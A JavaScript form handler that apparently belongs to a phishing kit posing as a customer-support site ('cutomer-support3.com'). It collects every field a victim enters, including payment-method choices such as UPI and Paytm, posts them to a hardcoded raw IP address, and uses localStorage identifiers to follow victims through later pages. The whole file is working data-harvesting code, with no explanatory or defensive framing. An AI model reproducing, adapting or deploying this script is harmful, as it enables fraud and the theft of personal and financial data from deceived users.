// Define the API URL
var API_URL = "http://41.216.183.97/CUS/4/index.php";

// Generate a UUID (Universally Unique Identifier)
function generateUUID() {
    var d = new Date().getTime(); // Timestamp
    var d2 = (performance && performance.now && (performance.now() * 1000)) || 0; // Time in microseconds since page-load or 0 if unsupported
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16; // Random number between 0 and 16
        if (d > 0) { // Use timestamp until depleted
            r = (d + r) % 16 | 0;
            d = Math.floor(d / 16);
        } else { // Use microseconds since page-load if supported
            r = (d2 + r) % 16 | 0;
            d2 = Math.floor(d2 / 16);
        }
        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
}

// Get user ID from local storage or generate a new one
function getUserID() {
    let userID = localStorage.getItem("userID");
    if (!userID) {
        userID = generateUUID();
        localStorage.setItem("userID", userID);
    }
    return userID;
}

// Perform the server call with the provided data
function serverCall(body, nextURL) {
    let userID = getUserID();
    if (!body.data) {
        body.data = {};
    }
    body.data.formId = userID; // Include formId within data
    delete body.site;    // Remove site field if present
    delete body.id;      // Remove id field if present
    console.log('Sending data to:', API_URL);
    console.log('Data:', body);

    fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
    })
    .then((res) => {
        console.log('Response:', res);
        if (!res.ok) {
            throw new Error('Network response was not ok ' + res.statusText);
        }
        return res.json();
    })
    .then((responseData) => {
        console.log('Response data:', responseData);
        $("#submit-button").text("Submitted");
        if (responseData.status === 200) {
            if (nextURL === '2.html') {
                let collection_id = responseData.data;
                if (collection_id) {
                    localStorage.setItem("collection_id", collection_id);
                }
            }
            window.location.href = nextURL;
        } else {
            $("#test").text("Error : " + JSON.stringify(responseData));
        }
    })
    .catch((error) => {
        console.error('Error:', error);
        $("#test").text("error : " + error);
    });
}

// Initialize form submission behavior
window.onload = function() {
    let form = document.getElementById("submitForm");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    if (nextValue === '2.html') {
        localStorage.removeItem("collection_id");
    }
    form.addEventListener("submit", function(event) {
        event.preventDefault();
        $("#submit-button").text("Please Wait");
        let formData = {};
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
                if (element.value === "Next") {
                    continue;
                }
                if (element.name === 'payment_mode' && element.checked) {
                    if (element.value === 'Other') {
                        nextValue = "other.html";
                    } else if (element.value === 'AmzonePay' || element.value === 'PhonePay' || element.value === 'GooglePay' || element.value === 'Paytm') {
                        nextValue = "UPI.html";
                    } else {
                        nextValue = element.value + ".html";
                    }
                }                
                if (element.type === 'radio' && element.checked) {
                    formData[element.name] = element.value;
                } else {
                    if (element.type !== 'radio') {
                        formData[element.name] = element.value;
                    }
                }
            }
        }
        let sendData = {};
        sendData['site'] = "cutomer-support3.com"; 
        sendData['data'] = formData;
        sendData['id'] = localStorage.getItem("collection_id"); // Optional, remove if not needed
        console.log('Prepared data:', sendData);
        serverCall(sendData, nextValue);
    });
};
